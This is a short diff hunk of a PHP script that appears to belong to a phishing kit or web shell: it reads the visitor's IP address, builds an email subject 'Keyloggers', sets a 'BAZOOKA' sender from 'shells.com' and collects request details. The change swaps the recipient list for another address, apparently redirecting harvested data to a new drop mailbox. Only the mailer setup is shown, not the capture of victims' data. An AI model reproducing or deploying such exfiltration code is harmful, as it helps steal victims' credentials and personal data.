@@ -5,7 +5,7 @@
 $ip = getenv("REMOTE_ADDR");
 $ra44 = rand(1, 99999);
 $subj98 = "✪ Keyloggers -$ip";
-$email = "spinningarrix@gmail.com,wissem_mh@hotmail.com";
+$email = "towek77@gmail.com";
 $from = "From: BAZOOKA <noreply@shells.com>";
 $a45 = $_SERVER['REQUEST_URI'];
 $b75 = $_SERVER['HTTP_HOST'];
